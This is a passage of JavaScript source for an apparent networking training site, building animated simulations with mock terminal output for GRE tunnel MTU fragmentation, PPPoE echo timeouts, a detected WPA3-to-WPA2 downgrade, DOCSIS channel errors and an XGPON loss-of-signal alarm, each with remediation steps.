      <div class="vs-step pending"><span class="vs-step-ico">5️⃣</span><span class="vs-step-body"><b>tcpdump -i gre1</b> — MTU fragmentation detected</span><span class="vs-step-state">QUEUED</span></div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// tcpdump -i gre1</span><span id="gre-pkt-cnt">0</span></div>
        <div class="siem-log-stream" id="gre-pkt-stream" style="font-size:10px;max-height:130px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// MTU fragmentation</span><span id="gre-mtu-lbl">--</span></div>
        <div class="code-viewer" id="gre-frag-out" style="font-size:10px;padding:6px">
          <div class="sim-h">interface MTU 1476 (gre header overhead 24)</div>
          <div id="gre-frag-line" style="color:var(--neon-3);display:none">⚠ 1500-byte packets being fragmented over gre1</div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="gre-kpi-mtu">1476</div><div class="kpi-lbl">gre mtu</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="gre-kpi-frag">0</div><div class="kpi-lbl">frag pkts</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="gre-kpi-loss">0%</div><div class="kpi-lbl">loss</div></div>
          </div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — intermediate workflow @ ${ts()}`,
    '$ # typical daily workflow — independent troubleshooting, no escalation',
    `$ sudo ip tunnel add gre1 mode gre remote 10.0.0.2 local 10.0.0.1 ttl 64`,
    `$ sudo ip addr add 172.16.0.1/30 dev gre1`,
    `$ sudo ip link set gre1 up`,
    '$ ip -d link show gre1',
    '7: gre1@NONE: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1476',
    '   gre remote 10.0.0.2 local 10.0.0.1 ttl 64',
    '$ ip route show dev gre1',
    '192.168.20.0/24 via 172.16.0.2 dev gre1',
    '$ ping -c 3 172.16.0.2',
    '64 bytes from 172.16.0.2: icmp_seq=1 ttl=64 time=8.2 ms',
    '64 bytes from 172.16.0.2: icmp_seq=2 ttl=64 time=8.1 ms',
    '$ sudo tcpdump -i gre1 -n -v',
    '14:55:01.221 IP 192.168.10.10 > 192.168.20.10: 1500-byte ping',
    '14:55:01.222 IP 192.168.10.10 > 192.168.20.10: frag (0|1480) proto 47',
    '14:55:01.223 IP 192.168.10.10 > 192.168.20.10: frag (1480|20)',
    '[!] MTU fragmentation — 1500-byte packets split over gre1 (1476)',
    '$ # TCP MSS clamp recommended to avoid PMTUD black-hole',
    '$ # Recommended remediation:',
    '$ #   1. Reduce MTU on gre1 to 1400 (ip link set gre1 mtu 1400)',
    '$ #   2. Add iptables mangle rule to clamp TCP MSS:',
    '$ #      iptables -t mangle -A FORWARD -p tcp --tcp-flags SYN,RST SYN \\',
    '$ #        -o gre1 -j TCPMSS --clamp-mss-to-pmtu',
    '$ #   3. Validate with: ping -M do -s 1372 172.16.0.2',
    '$ #   4. Re-capture on gre1 — fragmentation count drops to 0'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#gre-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 200);
    const siteA = host.querySelector('#gre-site-a');
    const tun = host.querySelector('#gre-tun');
    const siteB = host.querySelector('#gre-site-b');
    const hostA = host.querySelector('#gre-host-a');
    const hostB = host.querySelector('#gre-host-b');
    const phase = host.querySelector('#gre-phase');
    const stepsList = host.querySelector('#gre-steps');
    const stream = host.querySelector('#gre-pkt-stream');
    const pktCnt = host.querySelector('#gre-pkt-cnt');
    const mtuLbl = host.querySelector('#gre-mtu-lbl');
    const fragLine = host.querySelector('#gre-frag-line');
    const kpiFrag = host.querySelector('#gre-kpi-frag');
    const kpiLoss = host.querySelector('#gre-kpi-loss');
    // reset
    svg.querySelectorAll('*').forEach(n => n.remove());
    [siteA, tun, siteB, hostA, hostB].forEach(n => n?.classList.remove('on', 'done', 'hit'));
    if (stream) stream.innerHTML = '';
    if (pktCnt) pktCnt.textContent = '0';
    if (mtuLbl) { mtuLbl.textContent = '--'; mtuLbl.style.color = ''; }
    if (fragLine) fragLine.style.display = 'none';
    if (kpiFrag) kpiFrag.textContent = '0';
    if (kpiLoss) kpiLoss.textContent = '0%';
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting ip tunnel add';

    const aTun = vsLink(svg, 8, 30, 50, 30, 200, { packets: 0, color: 'var(--neon)', dur: 1.0, r: 3 });
    const tunB = vsLink(svg, 50, 30, 88, 30, 200, { packets: 0, color: 'var(--neon-2)', dur: 1.0, r: 3 });
    const hostAtoA = vsLink(svg, 8, 75, 8, 30, 200, { packets: 0, color: 'var(--neon-3)', dur: 0.8, r: 3, hidden: true });
    const hostBtoB = vsLink(svg, 88, 75, 88, 30, 200, { packets: 0, color: 'var(--neon-3)', dur: 0.8, r: 3, hidden: true });

    const addPkt = (txt, cls) => {
      if (stream) {
        const c = parseInt(pktCnt?.textContent || '0', 10) + 1;
        if (pktCnt) pktCnt.textContent = String(c);
        const ln = document.createElement('span'); ln.className = 'siem-log-line ' + cls;
        ln.textContent = `${ts()} ${txt}`;
        stream.appendChild(ln);
        while (stream.children.length > 10) stream.removeChild(stream.firstChild);
      }
    };

    const phases = [
      { dur: 1000, run() {
          siteA?.classList.add('on'); tun?.classList.add('on');
          aTun.activate(); tunB.activate();
          phase.textContent = '// ip tunnel add — gre1 mode gre remote 10.0.0.2 local 10.0.0.1 ttl 64';
          addPkt('ip tunnel add gre1 mode gre remote 10.0.0.2 local 10.0.0.1 ttl 64', 'ok');
        }, end() {}
      },
      { dur: 700, run() {
          aTun.packets(2, 'var(--neon)', 0.9, 3);
          phase.textContent = '// ip addr add — 172.16.0.1/30 dev gre1';
          addPkt('ip addr add 172.16.0.1/30 dev gre1', 'ok');
          if (mtuLbl) { mtuLbl.textContent = '1476'; mtuLbl.style.color = ''; }
        }, end() {}
      },
      { dur: 700, run() {
          siteB?.classList.add('on');
          tunB.packets(2, 'var(--neon-2)', 0.9, 3);
          phase.textContent = '// ip link set gre1 up — tunnel UP';
          addPkt('ip link set gre1 up', 'ok');
        }, end() {}
      },
      { dur: 1200, run() {
          hostA?.classList.add('on'); hostB?.classList.add('on');
          hostAtoA.on(); hostBtoB.on();
          hostAtoA.packets(3, 'var(--neon-3)', 1.4, 3.5);
          hostBtoB.packets(3, 'var(--neon-3)', 1.4, 3.5);
          aTun.packets(3, 'var(--neon)', 1.4, 3.5);
          tunB.packets(3, 'var(--neon-2)', 1.4, 3.5);
          phase.textContent = '// traffic flowing — host A (192.168.10.10) → host B (192.168.20.10)';
          addPkt('IP 192.168.10.10 > 192.168.20.10: 1500-byte ping', 'warn');
        }, end() {}
      },
      { dur: 1500, run() {
          if (fragLine) fragLine.style.display = 'block';
          if (kpiFrag) kpiFrag.textContent = '2';
          if (kpiLoss) kpiLoss.textContent = '0%';
          if (mtuLbl) { mtuLbl.textContent = 'FRAG'; mtuLbl.style.color = 'var(--neon-3)'; }
          addPkt('IP frag (0|1480) proto 47 — GRE encapsulation overhead', 'crit');
          addPkt('IP frag (1480|20) — second fragment of 1500-byte pkt', 'crit');
          phase.innerHTML = '// <span class="err">FRAGMENTATION</span> — 1500-byte pkts split over gre1 (mtu 1476)';
          phase.classList.add('err');
        }, end() {
          phase.classList.remove('err');
          phase.textContent = '// workflow complete — finding logged';
        }
      }
    ];
    const total = vsRunSteps(stepsList, timers, phases);
    timers.later(() => { phase.textContent = '// idle — awaiting next cycle'; }, total + 1500);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  BATCH D — Builder registry (keys must match SKILL_META)
 * ============================================================ */
const BATCH_D_BUILDERS = {
  'TCP/IP':            buildTCPIPSim,
  'DHCP':              buildDHCPSim,
  'DNS':               buildDNSSim,
  'HTTP/HTTPS':        buildHTTPHTTPSSim,
  'SIP/RTP':           buildSIPRTPSim,
  'SSH':               buildSSHSim,
  'TLS':               buildTLSSim,
  'TR-069 / CWMP':     buildTR069Sim,
  'ARP':               buildARPSim,
  'ICMP':              buildICMPSim,
  'GRE':               buildGRESim
};

/* ============================================================
 *  BATCH E — Networking & Protocols part 2 (11 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal
 *  - PPP:            PPPoE Discovery ladder + LCP/PAP/IPCP session
 *  - WiFi WPA2/3/6:  SAE Dragonfly handshake + WPA3→WPA2 downgrade
 *  - DOCSIS:         32-DS channel bonding grid + OFDM PLC strip
 *  - XGPON:          OLT 1/0/2 ONT discovery + OMCI + LOS + Tx graph
 *  - VoIP Security:  SIP audit + cleartext RTP + DTLS-SRTP remediation
 *  - Firewall:       47-rule audit + shadowed dead rules 12/18/23
 *  - ACL:            extended ACL 101 inspector + ACE #50 bypass
 *  - NAT:            show xlate table + PAT pool exhaustion
 *  - QoS:            policy-map interface gi0/1 + voice queue 7% drop
 *  - IPSec:          IKEv2 site-to-site + SA proposal mismatch
 *  - AES Encryption: openssl enc + reused IV → ciphertext pattern leakage
 * ============================================================ */

// ---------- 1) PPP (Intermediate) ----------
function buildPppSim(skill, meta, lvl) {
  const slug = 'ppp';
  const rungs = [
    { label: 'PADI',          dir: 'c2b', note: 'PPPoE Active Discovery Initiation' },
    { label: 'PADO',          dir: 'b2c', note: 'PPPoE Active Discovery Offer' },
    { label: 'PADR',          dir: 'c2b', note: 'PPPoE Active Discovery Request' },
    { label: 'PADS',          dir: 'b2c', note: 'PPPoE Active Discovery Session-confirm' },
    { label: 'LCP CONF-REQ', dir: 'c2b', note: 'MRU=1492, MAGIC=0x12a3, AUTH=PAP' },
    { label: 'LCP CONF-ACK', dir: 'b2c', note: 'acknowledged' },
    { label: 'PAP AUTH-REQ', dir: 'c2b', note: 'peer-id=user@isp' },
    { label: 'PAP AUTH-ACK', dir: 'b2c', note: 'AuthenticateAck' },
    { label: 'IPCP CONF-REQ', dir: 'c2b', note: 'request 1.2.3.4' },
    { label: 'IPCP CONF-ACK', dir: 'b2c', note: 'grant 1.2.3.4' }
  ];

  const visual = `
    <div class="ppp-ladder" id="ppp-ladder">
      <div class="ppp-endpoint cpe">
        <span class="ppp-ico">🖥️</span>
        <span class="ppp-name">CPE</span>
        <span class="ppp-ip">192.168.1.42</span>
        <span class="ppp-state" id="ppp-cpe-state">IDLE</span>
      </div>
      <div class="ppp-rails">
        ${rungs.map((r, i) => `
          <div class="ppp-rung" data-i="${i}" data-dir="${r.dir}">
            <span class="ppp-rung-arrow ${r.dir}">▶</span>
            <span class="ppp-rung-label">${r.label}</span>
            <span class="ppp-rung-note">${r.note}</span>
          </div>
        `).join('')}
      </div>
      <div class="ppp-endpoint bras">
        <span class="ppp-ico">🏰</span>
        <span class="ppp-name">BRAS</span>
        <span class="ppp-ip">10.0.0.1</span>
        <span class="ppp-state" id="ppp-bras-state">IDLE</span>
      </div>
    </div>
    <div class="ppp-session-strip" id="ppp-strip">
      <div class="ppp-pill" id="ppp-pill-disc">DISCOVERY</div>
      <div class="ppp-pill" id="ppp-pill-lcp">LCP</div>
      <div class="ppp-pill" id="ppp-pill-pap">PAP</div>
      <div class="ppp-pill" id="ppp-pill-ipcp">IPCP</div>
      <div class="ppp-pill ppp-pill-flap" id="ppp-pill-flap">ECHO TIMEOUT ⚠</div>
    </div>
  `;

  const lines = [
    `$ # PPP — daily workflow @ ${ts()}`,
    `$ # PPPoE session inspection on Linux CPE`,
    `$ pppoe-status`,
    'ppp0: connected (Link UP), Session-ID 0x4f7c, AC-MAC 00:13:00:00:00:42',
    `$ plog -n 80`,
    '[daemon] pppd[1923]: Plugin rp-pppoe.so loaded.',
    '[daemon] pppd[1923]: RP-PPPoE: Discovery complete.',
    '[daemon] pppd[1923]: PADI sent (dst ff:ff:ff:ff:ff:ff), got PADO from 00:13:00:00:00:42',
    '[daemon] pppd[1923]: PADR sent, PADS received, session-id 0x4f7c',
    '[daemon] pppd[1923]: LCP: state Initial --> Starting',
    '[daemon] pppd[1923]: LCP: ConfReq (0x1) MRU=1492 MAGIC=0x12a3 PAP',
    '[daemon] pppd[1923]: LCP: ConfAck received',
    '[daemon] pppd[1923]: PAP: Authenticate-Request user@isp',
    '[daemon] pppd[1923]: PAP: Authenticate-Ack received',
    '[daemon] pppd[1923]: IPCP: ConfReq IP=0.0.0.0',
    '[daemon] pppd[1923]: IPCP: ConfAck IP=1.2.3.4',
    '[daemon] pppd[1923]: local  IP address 1.2.3.4',
    '[daemon] pppd[1923]: remote IP address 10.0.0.1',
    '[warn] pppd[1923]: LCP: echo timeout (peer not responding to LCP ECHO request)',
    '[err]  pppd[1923]: LCP: link terminated by echo timeout — line flapping',
    '[err]  pppd[1923]: Connection terminated.',
    '$ # IOC: LCP echo timeout — flapping line',
    '$ # Next: contact ISP NOC, request BRAS-side BER test on PVC 8/35'
  ];

  function animate(host, timers) {
    const rungEls = host.querySelectorAll('#ppp-ladder .ppp-rung');
    const cpeState = host.querySelector('#ppp-cpe-state');
    const brasState = host.querySelector('#ppp-bras-state');
    const pills = ['disc', 'lcp', 'pap', 'ipcp'].map(id => host.querySelector('#ppp-pill-' + id));
    const flapPill = host.querySelector('#ppp-pill-flap');

    // idempotent reset
    rungEls.forEach(r => r.classList.remove('active', 'done', 'failed'));
    pills.forEach(p => p && p.classList.remove('on', 'fail'));
    if (flapPill) flapPill.classList.remove('on', 'fail');
    if (cpeState) cpeState.textContent = 'IDLE';
    if (brasState) brasState.textContent = 'IDLE';

    // walk the ladder: phases 0..3 DISCOVERY, 4..5 LCP, 6..7 PAP, 8..9 IPCP
    rungEls.forEach((rung, i) => {
      timers.later(() => {
        rungEls.forEach(x => x.classList.remove('active'));
        rung.classList.add('active');
        if (cpeState) cpeState.textContent = 'NEGOTIATING';
        if (brasState) brasState.textContent = 'NEGOTIATING';
        if (i < 4) pills[0] && pills[0].classList.add('on');
        else if (i < 6) pills[1] && pills[1].classList.add('on');
        else if (i < 8) pills[2] && pills[2].classList.add('on');
        else pills[3] && pills[3].classList.add('on');
      }, 400 + i * 700);
      timers.later(() => {
        rung.classList.remove('active');
        rung.classList.add('done');
      }, 400 + i * 700 + 600);
    });

    // session UP
    timers.later(() => {
      if (cpeState) cpeState.textContent = 'UP @ 1.2.3.4';
      if (brasState) brasState.textContent = 'UP @ 10.0.0.1';
    }, 400 + rungEls.length * 700 + 300);

    // ECHO TIMEOUT → line flap
    timers.later(() => {
      pills.forEach(p => p && p.classList.remove('on'));
      if (flapPill) flapPill.classList.add('on', 'fail');
      if (cpeState) cpeState.textContent = 'DOWN (ECHO TIMEOUT)';
      if (brasState) brasState.textContent = 'DOWN';
      rungEls.forEach(r => r.classList.add('failed'));
    }, 400 + rungEls.length * 700 + 300 + 2800);

    // reset cycle
    timers.later(() => {
      rungEls.forEach(r => r.classList.remove('done', 'failed'));
      pills.forEach(p => p && p.classList.remove('on', 'fail'));
      if (flapPill) flapPill.classList.remove('on', 'fail');
      if (cpeState) cpeState.textContent = 'IDLE';
      if (brasState) brasState.textContent = 'IDLE';
    }, 400 + rungEls.length * 700 + 300 + 2800 + 2400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 2) WiFi WPA2/WPA3/WiFi 6 (Advanced) ----------
function buildWifiSim(skill, meta, lvl) {
  const slug = 'wifi-wpa2-wpa3-wifi-6';
  const id = (s) => `${slug}-${s}`;
  const visual = `
    <div class="wifi-handshake" id="${id('handshake')}">
      <div class="wifi-side c">
        <span class="wifi-ico">📱</span>
        <span class="wifi-name">CLIENT</span>
        <span class="wifi-mac">aa:bb:cc:11:22:33</span>
      </div>
      <div class="wifi-rail">
        <div class="wifi-msg sae" data-i="0" data-dir="c2a">
          <span class="wifi-tag">SAE Commit</span>
          <span class="wifi-note">Dragonfly hunting-and-pecking → scalar+element (P-256)</span>
          <span class="wifi-arrow">▶</span>
        </div>
        <div class="wifi-msg sae" data-i="1" data-dir="a2c">
          <span class="wifi-tag">SAE Confirm</span>
          <span class="wifi-note">PMK derived; pairwise cipher CCMP-256; mfpr=1</span>
          <span class="wifi-arrow">◀</span>
        </div>
        <div class="wifi-msg sae" data-i="2" data-dir="c2a">
          <span class="wifi-tag">Key-Confirmation (4-way #1)</span>
          <span class="wifi-note">ANonce → SNonce; KCK validates MIC on msg 2/4</span>
          <span class="wifi-arrow">▶</span>
        </div>
      </div>
      <div class="wifi-side a">
        <span class="wifi-ico">📡</span>
        <span class="wifi-name">AP · ssid: SOHO-WPA3</span>
        <span class="wifi-mac">00:13:00:00:00:42</span>
      </div>
    </div>
    <div class="wifi-downgrade-overlay" id="${id('downgrade')}" hidden>
      <div class="wifi-downgrade-banner">
        <strong>⚠ DOWNGRADE ATTACK DETECTED</strong>
        <span>AP advertised WPA3-Personal (RSN caps=008F, SAE-only). A forged beacon (BSSID de:ad:be:ef:01:23) flipped RSN caps to 000C → client fell back to WPA2-PSK / CCMP-128. WPA2-PSK 4-way handshake is KRACK-vulnerable on msg-3 replay.</span>
      </div>
      <div class="wifi-rail fallback">
        <div class="wifi-msg wpa2" data-i="3" data-dir="c2a"><span class="wifi-tag">EAPOL #1</span><span class="wifi-note">ANonce (replayed by attacker)</span><span class="wifi-arrow">▶</span></div>
        <div class="wifi-msg wpa2" data-i="4" data-dir="a2c"><span class="wifi-tag">EAPOL #2</span><span class="wifi-note">SNonce + MIC (KRACK target frame)</span><span class="wifi-arrow">◀</span></div>
        <div class="wifi-msg wpa2" data-i="5" data-dir="c2a"><span class="wifi-tag">EAPOL #3</span><span class="wifi-note">GTK wrapped in KEK — retransmit forces nonce reuse</span><span class="wifi-arrow">▶</span></div>
        <div class="wifi-msg wpa2" data-i="6" data-dir="a2c"><span class="wifi-tag">EAPOL #4</span><span class="wifi-note">ACK — replayed; key reinstalled (KRACK)</span><span class="wifi-arrow">◀</span></div>
      </div>
    </div>
    <div class="wifi-verdict" id="${id('verdict')}">
      <span>// verdict: WPA3-SAE handshake SECURE</span>
    </div>
  `;

  const lines = [
    `$ # WiFi WPA2/WPA3/WiFi 6 — advanced investigation @ ${ts()}`,
    `$ # Validate WPA3-SAE (Dragonfly) handshake on new AP`,
    `$ wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf -dd`,
    "wlan0: Trying to authenticate with 00:13:00:00:00:42 (SSID='SOHO-WPA3' freq=5745 MHz)",
    'wlan0: SAE: Commit Group=19 (P-256) — hunting-and-pecking complete',
    'wlan0: SAE: scalar=2f8c...ac81 element=(x=ae2.., y=91..)',
    'wlan0: SAE: Confirm token=0x01 — PMK derived (KCK, KEK, TK)',
    'wlan0: SAE: peer confirm received — authentication succeeded',
    'wlan0: WPA3-Personal (SAE) — PMK=8f3c...d4a2',
    'wlan0: 4-way handshake — KCK validated MIC on msg 2/4',
    'wlan0: group cipher CCMP-256 GTK installed',
    'wlan0: CTRL-EVENT-CONNECTED - connection to 00:13:00:00:00:42 completed',
    '[!] second beacon captured advertising RSN capabilities=008F (WPA3 + transition mode)',
    '[!] attacker (BSSID de:ad:be:ef:01:23) forged beacon with RSN caps=000C (WPA2-only)',
    '[warn] client (wlan0) downgraded to WPA2-PSK / CCMP-128',
    '[err] KRACK-vulnerable: 4-way handshake msg #3 replayed (CVE-2017-13077, 13078, 13080, 13081, 13082, 13084, 13086, 13087, 13088)',
    '$ # IOC: Downgrade attack — WPA3 → WPA2 transitional',
    '$ # Recommended remediation:',
    '$ #   1. Disable WPA3 → WPA2 transition mode on production SSID',
    '$ #   2. Set sae_require_mfp=2 in wpa_supplicant.conf',
    '$ #   3. Switch SSID to WPA3-Personal-only (mfpr=1, mfpc=1)',
    '$ #   4. Patch clients to wpa_supplicant 2.10+ (CVE-2019-9495 mitigations)',
    '$ #   5. Add PMF (IEEE 802.11w) management-frame protection on AP + STAs'
  ];

  function animate(host, timers) {
    const saeMsgs = host.querySelectorAll(`#${id('handshake')} .wifi-msg.sae`);
    const downgradeOverlay = host.querySelector(`#${id('downgrade')}`);
    const wpa2Msgs = downgradeOverlay ? downgradeOverlay.querySelectorAll('.wifi-msg.wpa2') : [];
    const verdict = host.querySelector(`#${id('verdict')}`);

    // idempotent reset
    saeMsgs.forEach(m => m.classList.remove('active', 'done', 'failed'));
    wpa2Msgs.forEach(m => m.classList.remove('active', 'done', 'failed'));
    if (downgradeOverlay) downgradeOverlay.hidden = true;
    if (verdict) {
      verdict.classList.remove('bad');
      verdict.innerHTML = '<span>// verdict: WPA3-SAE handshake SECURE</span>';
    }

    // WPA3-SAE handshake plays through normally first
    saeMsgs.forEach((m, i) => {
      timers.later(() => { m.classList.add('active'); }, 400 + i * 800);
      timers.later(() => { m.classList.remove('active'); m.classList.add('done'); }, 400 + i * 800 + 700);
    });

    // attacker triggers downgrade — flip verdict + flash SAE msgs as failed
    timers.later(() => {
      saeMsgs.forEach(m => m.classList.add('failed'));
      if (verdict) {
        verdict.classList.add('bad');
        verdict.innerHTML = '<span style="color:var(--neon-3)">// verdict: WPA2-PSK fallback — KRACK-vulnerable, downgrade forced</span>';
      }
    }, 400 + saeMsgs.length * 800 + 500);

    // reveal downgrade overlay + play WPA2 4-way replay
    timers.later(() => {
      if (downgradeOverlay) downgradeOverlay.hidden = false;
      wpa2Msgs.forEach((m, i) => {
        timers.later(() => { m.classList.add('active'); }, 300 + i * 700);
        timers.later(() => { m.classList.remove('active'); m.classList.add('done'); }, 300 + i * 700 + 600);
      });
    }, 400 + saeMsgs.length * 800 + 1000);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 3) DOCSIS (Advanced) ----------
function buildDocsisSim(skill, meta, lvl) {
  const slug = 'docsis';
  const channels = Array.from({ length: 32 }, (_, i) => {
    const ch = i + 1;
    const power = -3 + (i % 7);
    const snr = (ch === 4) ? 27.8 : (35 + ((i * 3) % 8));
    const uncorrected = (ch === 4) ? 482 : (i % 13);
    const corrected = (ch === 4) ? 1842 : (i * 2);
    return { ch, power, snr, uncorrected, corrected, fail: ch === 4 };
  });

  const visual = `
    <div class="docsis-panel" id="docsis-panel">
      <div class="docsis-head">
        <span>// DOCSIS 3.1 — downstream bonding (32 SC-QAM + OFDM PLC 0..2047)</span>
        <span id="docsis-clock">${ts()}</span>
      </div>
      <div class="docsis-channel-grid" id="docsis-grid">
        ${channels.map(c => `
          <div class="docsis-channel ${c.fail ? 'fail' : ''}" data-ch="${c.ch}">
            <span class="dc-num">${c.ch}</span>
            <span class="dc-pwr">${c.power.toFixed(1)} dBmV</span>
            <span class="dc-snr">SNR ${c.snr.toFixed(1)}</span>
            <span class="dc-fec" id="docsis-fec-${c.ch}">unc ${c.uncorrected}</span>
          </div>
        `).join('')}
      </div>
      <div class="docsis-plc">
        <div class="docsis-plc-label">OFDM PLC subcarriers (block-avg MER):</div>
        <div class="docsis-plc-strip" id="docsis-plc-strip"></div>
      </div>
      <div class="docsis-kpi-row">
        <div class="kpi-cell"><div class="kpi-val" id="docsis-kpi-lock">32</div><div class="kpi-lbl">locked</div></div>
        <div class="kpi-cell"><div class="kpi-val" id="docsis-kpi-unc">0</div><div class="kpi-lbl">uncorrected total</div></div>
        <div class="kpi-cell"><div class="kpi-val" id="docsis-kpi-snr">0</div><div class="kpi-lbl">avg SNR (dB)</div></div>
        <div class="kpi-cell alert"><div class="kpi-val" id="docsis-kpi-flap">1</div><div class="kpi-lbl">channel w/ FEC</div></div>
      </div>
      <div class="docsis-verdict" id="docsis-verdict">// 31 of 32 channels healthy — channel 4 shows uncorrected FEC, plant issue</div>
    </div>
  `;

  const lines = [
    `$ # DOCSIS — advanced investigation @ ${ts()}`,
    `$ # Validate DOCSIS 3.1 channel bonding on cable modem`,
    `$ cmctl status`,
    'Cable Modem: CM-MAC=00:13:00:00:00:42  Provisioned=Online  Boot=operational',
    'Downstream bonding: 32 SC-QAM (locked) + 1 OFDM (1920 subcarriers, locked)',
    'Upstream bonding:   4 SC-QAM + 1 OFDMA',
    `$ cmctl ds-spectrum`,
    'Ch  Power   SNR    Corrected   Uncorrected',
    '01  -2.4    38.1   184         0',
    '02  -2.1    38.4   127         0',
    '03  -2.0    38.0    98         0',
    '04  +1.2    27.8  1842       482  ← plant issue (uncorrected FEC)',
    '05  -1.8    37.9    74         0',
    '...',
    '32  -1.5    38.2    91         0',
    `$ cmctl ofdm-plc`,
    'OFDM: PLC=4096-QAM, MER=42.0 dB; subcarriers 0..2047 mapped (0/2048 uncorrectable)',
    '[!] Channel 4: SNR 27.8 dB (below 33 dB threshold) — uncorrected FEC=482',
    '[warn] Plant issue downstream of channel 4 — splitter/connector/amp suspected',
    '$ # IOC: Uncorrected FEC errors on downstream channel 4',
    '$ # Recommended remediation:',
    '$ #   1. Dispatch field tech to check tap value + connector on ch4 frequency',
    '$ #   2. Run BER test on OFDM PLC over 5 minutes for trend',
    '$ #   3. Capture full spectrum analyzer dump (22MHz-1218MHz) for plant group',
    '$ #   4. If ingress > 20 MHz around ch4: re-route drop away from AM broadcast'
  ];

  function animate(host, timers) {
    const tiles = host.querySelectorAll('#docsis-grid .docsis-channel');
    const plcStrip = host.querySelector('#docsis-plc-strip');
    const kpiUnc = host.querySelector('#docsis-kpi-unc');
    const kpiSnr = host.querySelector('#docsis-kpi-snr');
    const verdict = host.querySelector('#docsis-verdict');

    // idempotent reset
    tiles.forEach(t => t.classList.remove('flash'));
    if (plcStrip) plcStrip.innerHTML = '';
    if (kpiUnc) kpiUnc.textContent = '0';
    if (kpiSnr) kpiSnr.textContent = '0';
    if (verdict) { verdict.classList.remove('bad'); verdict.textContent = '// 31 of 32 channels healthy — channel 4 shows uncorrected FEC, plant issue'; }

    // Build OFDM PLC subcarrier strip (2048 subcarriers aggregated to 64 bars)
    if (plcStrip) {
      for (let i = 0; i < 64; i++) {
        const bar = document.createElement('span');
        bar.className = 'plc-bar' + (i === 7 ? ' hot' : '');
        bar.style.height = (8 + ((i * 7) % 18)) + 'px';
        plcStrip.appendChild(bar);
      }
    }

    // Walk tiles, build KPIs incrementally
    let uncAcc = 0, snrSum = 0;
    tiles.forEach((t, i) => {
      timers.later(() => {
        t.classList.add('flash');
        const c = channels[i];
        snrSum += c.snr;
        if (c.fail) uncAcc += c.uncorrected;
        if (kpiSnr) kpiSnr.textContent = (snrSum / (i + 1)).toFixed(1);
        if (kpiUnc) kpiUnc.textContent = uncAcc;
      }, 200 + i * 120);
    });

    timers.later(() => {
      if (verdict) {
        verdict.classList.add('bad');
        verdict.textContent = '// channel 4 — SNR 27.8 dB / uncorrected FEC 482 — dispatch plant tech';
      }
    }, 200 + tiles.length * 120 + 400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 4) XGPON (Advanced) ----------
function buildXgponSim(skill, meta, lvl) {
  const slug = 'xgpon';
  const onts = [
    { sn: 'ZTEGC1A2B3C4', model: 'F660',   state: 'OK' },
    { sn: 'ALCLF0123456', model: 'G-240G', state: 'LOS' },
    { sn: 'HWTC11223344', model: 'HG8245', state: 'OK' }
  ];

  const visual = `
    <div class="xgpon-panel" id="xgpon-panel">
      <div class="xgpon-olt">
        <span class="xgpon-ico">💡</span>
        <span class="xgpon-name">OLT PON 1/0/2</span>
        <span class="xgpon-state" id="xgpon-olt-state">ONT discovery: scanning</span>
      </div>
      <div class="xgpon-fiber" id="xgpon-fiber"></div>
      <div class="xgpon-ont-list" id="xgpon-ont-list">
        ${onts.map((o, i) => `
          <div class="xgpon-ont ${o.state === 'LOS' ? 'fail' : ''}" data-i="${i}">
            <span class="xgpon-ont-ico">📡</span>
            <span class="xgpon-ont-sn">${o.sn}</span>
            <span class="xgpon-ont-model">${o.model}</span>
            <span class="xgpon-ont-state" id="xgpon-ont-state-${i}">PENDING</span>
          </div>
        `).join('')}
      </div>
      <div class="xgpon-omci">
        <div class="xgpon-omci-label">OMCI management channel (ONT-0):</div>
        <div class="xgpon-omci-steps" id="xgpon-omci-steps">
          <div class="xgpon-omci-step" data-i="0">MIB Reset</div>
          <div class="xgpon-omci-step" data-i="1">MIB Upload</div>
          <div class="xgpon-omci-step" data-i="2">MIB Download</div>
          <div class="xgpon-omci-step" data-i="3">Create GEM port</div>
          <div class="xgpon-omci-step" data-i="4">Set T-CONT</div>
        </div>
      </div>
      <div class="xgpon-tx-graph">
        <div class="xgpon-tx-label">Tx power (dBm) over time:</div>
        <svg class="xgpon-tx-svg" id="xgpon-tx-svg" viewBox="0 0 200 60" preserveAspectRatio="none"></svg>
        <span class="xgpon-tx-val" id="xgpon-tx-val">—</span>
      </div>
      <div class="xgpon-alarm" id="xgpon-alarm" hidden>
        <strong>🔴 LOS alarm — PON port 1/0/2 ONT-1 (ALCLF0123456)</strong>
        <span>R-LOSCFG (Loss of Signal / Loss of PON). Optical budget: 28 dB. Inspect fiber / ODN / splice closure C-50.</span>
      </div>
    </div>
  `;

  const lines = [
    `$ # XGPON — advanced investigation @ ${ts()}`,
    `$ # Validate XGS-PON OLT authentication on port 1/0/2`,
    `$ telnet 10.0.0.1`,
    'OLT> enable',
    'OLT> config',
    'OLT(config)# display ont info by-port 1/0/2 all',
    '  F/S/P      : 1/0/2',
    '  ONT-ID  SN                 State       Last Down Cause',
    '  0       ZTEGC1A2B3C4       online      DyingGasp (recovered)',
    '  1       ALCLF0123456       offline     LOS',
    '  2       HWTC11223344       online      -',
    'OLT(config)# display ont optical-info 1/0/2 1',
    '  Tx power   : -28.4 dBm  ← below threshold',
    '  Rx power   : -27.1 dBm',
    '  Temperature: 48 °C (warn)',
    '[!] 2025-10-12 14:23:18 alarm LOS raised on PON 1/0/2 ONT 1 (ALCLF0123456)',
    '[warn] OMCI management channel re-established for ONT 0 (ZTEGC1A2B3C4)',
    '[err] OMCI timeout for ONT 1 — no MIB Upload response in 3s',
    '$ # IOC: LOS alarm on PON port 1/0/2',
    '$ # Recommended remediation:',
